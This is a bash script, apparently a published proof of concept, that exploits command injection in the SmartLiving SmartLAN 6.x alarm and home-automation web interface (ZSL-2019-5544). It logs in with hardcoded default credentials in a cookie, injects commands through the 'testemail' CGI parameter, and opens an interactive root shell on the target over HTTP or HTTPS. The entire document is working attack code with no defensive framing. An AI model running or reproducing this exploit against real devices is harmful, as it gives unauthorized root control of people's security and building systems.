URL=$1
CGI="/cgi-bin/web.cgi"
COOK="user=admin;pass=pass;code=9999"
COOK1="user=admin;pass=pass;code=9998"
COOK2="user=user;pass=pass;code=0001"
PARAMS="mod=testemail&par=;"
CHECK=${URL:4:1}

if [ "$#" -ne 1 ]; then
	echo -en "\e[34m"
	echo "==============================================="
	echo " SmartLiving  SmartLAN 6.x Remote Root Exploit"
	echo -e "\t\tZSL-2019-5544"
	echo "==============================================="
	echo -en "\e[00m"
	echo -e "\nUsage: $0 http(s)://ip:port\n"
    exit 0
fi

echo -ne "\nChecking target: $URL\n"

if [ "$CHECK" == "s" ]; then
	TEST=$(curl -sIk $URL 2>/dev/null | head -1 | awk -F" " '{print $2}')
	if [[ "$?" = "7" ]] || [[ $TEST != "200" ]]; then
		echo "HTTPS with error!"
		exit 0
	fi
	if curl -sik -X POST "$URL$CGI" -H "Cookie: $COOK" -d"${PARAMS}id" | grep uid 1>/dev/null
	then
		echo -e "ACCESS GRANTED!\n"
	else
		echo "Invalid credentials."
		exit 0
	fi
	while true; do
		R="$(tput sgr0)"
		S="$(tput setaf 2)"
		read -rp "${S}root@ssl>${R} " CMD
		if [[ "$CMD" == "exit" ]]; then
			exit 0
		fi
		curl -sik -X POST "$URL$CGI" -H "Cookie: $COOK" -d"$PARAMS${CMD}" | awk "/Connection: close/{j=1;next}j" | head -n -5 
	done
else
	TEST=$(curl -sI $URL 2>/dev/null | head -1 | awk -F" " '{print $2}')
	if [[ "$?" = "7" ]] || [[ $TEST != "200" ]]; then
		echo "HTTP with error!"
		exit 0
	fi
	if curl -si -X POST "$URL$CGI" -H "Cookie: $COOK" -d"${PARAMS}id" | grep uid 1>/dev/null
	then
		echo -e "ACCESS GRANTED!\n"
	else
		echo "Invalid credentials."
		exit 0
	fi
	while true; do
		R="$(tput sgr0)"
		S="$(tput setaf 2)"
		read -rp "${S}root@http>${R} " CMD
		if [[ "$CMD" == "exit" ]]; then
			exit 0
		fi
		curl -si -X POST "$URL$CGI" -H "Cookie: $COOK" -d"$PARAMS${CMD}" | awk "/Connection: close/{j=1;next}j" | head -n -5
	done
fi
 
